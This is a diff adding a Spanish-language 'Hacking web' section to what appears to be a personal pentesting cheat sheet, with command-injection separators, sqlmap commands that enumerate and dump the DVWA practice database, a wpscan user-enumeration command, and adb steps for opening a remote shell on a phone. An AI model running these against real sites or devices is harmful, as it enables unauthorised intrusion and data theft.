@@ -256,6 +256,73 @@ Descifrar hashes
 
 `Abrir aplicacion >> Create Volume >> `
 
+## Hacking web
+
+### Command Injection
+
+Bypass / Concatenar
+
+`;`
+
+`|`
+
+`&&`
+
+
+### SQLMap
+
+Obtener con Burpsuite el archivo del request
+
+`Click sobre la peticion >> Save Item >> Guardar archivo.txt`
+
+Enumerar bases de datos
+
+`sqlmap -r req.txt --dbs`
+
+`sqlmap -r req.txt -D dvwa`
+
+Enumerar tablas
+
+`sqlmap -r req.txt -D dvwa --tables`
+
+Enumerar columnas
+
+`sqlmap -r req.txt -D dvwa --tables --columns`
+
+Dump de datos
+
+`sqlmap -r req.txt -D dvwa --dump`
+
+
+### WPS Scan
+
+Enumerar usuarios
+
+`wpscan --url http://url.com/ --enumerate u`
+
+### ADB
+
+Listar celulares conectados por cable
+`adb devices`
+
+Conectar al celular
+
+`adb connect IP:PORT`
+
+`adb connect 192.168.0.100:5555`
+
+Ejecutar shell
+
+`adb shell`
+
+Comandos
+
+`ls`
+
+`whoami`
+
+`cd /sdcard`
+
 
 
 
